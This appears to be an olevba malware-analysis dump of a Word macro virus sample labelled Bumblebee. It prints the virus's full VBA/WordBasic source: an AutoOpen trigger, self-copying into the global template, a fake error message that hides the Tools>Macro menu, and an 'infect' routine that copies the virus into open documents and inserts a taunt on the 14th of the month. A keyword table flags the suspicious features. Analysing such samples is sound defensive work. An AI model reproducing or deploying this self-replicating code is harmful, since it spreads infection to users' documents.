olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Intended.Bumblebee.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Intended.Bumblebee.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Intended.Bumblebee.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.Call "Disease"
End Sub
-------------------------------------------------------------------------------
VBA MACRO Disease.bas 
in file: ./Virus.MSWord.Intended.Bumblebee.b - OLE stream: 'Macros/VBA/Disease'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim stealth$
Dim Auto$
Dim ToolsMacro$
Dim infect$
'
' Another Bumblebee virus ;)
'
On Error Resume Next
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Disease", "Global:Disease", 1
stealth$ = "Sub MAIN" + Chr(10) + "MsgBox " + Chr(34) + "Invalid call in shared memory 0x0cc7f000" + Chr(34) + "," + Chr(34) + "Error" + Chr(34) + ",16" + Chr(10) + "ArchivoSalir 1" + Chr(10) + "End Sub"
Auto$ = "Sub MAIN" + Chr(10) + "Disease" + Chr(10) + "End Sub"
ToolsMacro$ = WordBasic.[MenuItemMacro$](WordBasic.[MenuText$](0, 6, 0), 0, 13)
WordBasic.ToolsMacro Name:=ToolsMacro$, Show:=1, Edit:=1
WordBasic.EditSelectAll
WordBasic.Insert stealth$
WordBasic.DocClose 1
WordBasic.ToolsMacro Name:="AutoOpen", Show:=1, Edit:=1
WordBasic.EditSelectAll
WordBasic.Insert Auto$
WordBasic.DocClose 1
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
infect$ = "On Error Resume Next" + Chr(10) + "Dim dlg As ArchivoGuardarComo" + Chr(10) + "If Día(Ahora()) = 14 Then payload = 1 else payload=0" + Chr(10) + "for i=1 to ContarVentanas()" + Chr(10) + "ListaVentana i" + Chr(10) + "GetCurValues dlg" + Chr(10) + "If dlg.Formato = 0 Then" + Chr(10) + "ArchivoGuardarComo .Formato = 1" + Chr(10) + "MacroCopiar " + Chr(34) + "Global:Disease" + Chr(34) + ", NombreArchivo$() + " + Chr(34) + ":Disease" + Chr(34) + ", 1" + Chr(10) + "MacroCopiar " + Chr(34) + "Global:AutoOpen" + Chr(34) + ", NombreArchivo$() + " + Chr(34) + ":AutoOpen" + Chr(34) + ", 1" + Chr(10) + "ArchivoGuardar" + Chr(10) + "End If" + Chr(10) + "If payload = 1 And EsMacro() = 0 Then" + Chr(10) + "EdiciónSeleccionarTodo" + Chr(10) + "Insertar " + Chr(34) + "Another happy infected user... by Disease virus rel2" + Chr(34) + Chr(10) + "End If" + Chr(10) + "next i" + Chr(10)
WordBasic.ToolsMacro Name:="infect", Show:=1, Edit:=1
WordBasic.Insert infect$
WordBasic.ToolsMacro Name:="infect", Run:=1
WordBasic.ToolsMacro Name:="infect", Edit:=1
WordBasic.DocClose 2
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

